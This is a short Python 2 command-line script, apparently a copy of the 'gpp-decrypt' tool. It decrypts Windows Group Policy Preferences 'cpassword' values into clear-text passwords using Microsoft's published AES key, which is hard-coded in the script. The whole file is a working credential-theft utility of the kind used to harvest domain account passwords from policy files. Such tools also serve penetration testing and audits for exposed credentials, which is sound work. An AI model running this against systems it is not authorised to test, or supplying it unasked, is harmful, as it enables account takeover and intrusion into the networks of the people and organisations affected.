#!/usr/bin/python
import sys
from Crypto.Cipher import AES
from base64 import b64decode
from binascii import unhexlify, hexlify

# Thx Microsoft
# https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx
AES_KEY = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"

def decrypt(cpassword):
    cpassword += "=" * (16 - len(cpassword) % 16) # Pad
    db64 = b64decode(cpassword)
    result = AES.new(unhexlify(AES_KEY), AES.MODE_CBC, "\x00"*16).decrypt(db64)
    print "\n[+] Clear-text password: %s" % (result[:-ord(result[-1])].decode("utf-16")) # Unpad and decode


if len(sys.argv) != 2:
    print "\nUsage: %s <cpassword>" % (sys.argv[0])
    sys.exit(0)

try:
    decrypt(sys.argv[1])
except Exception as e:
    print "\n[!] Error: %s" % (e)
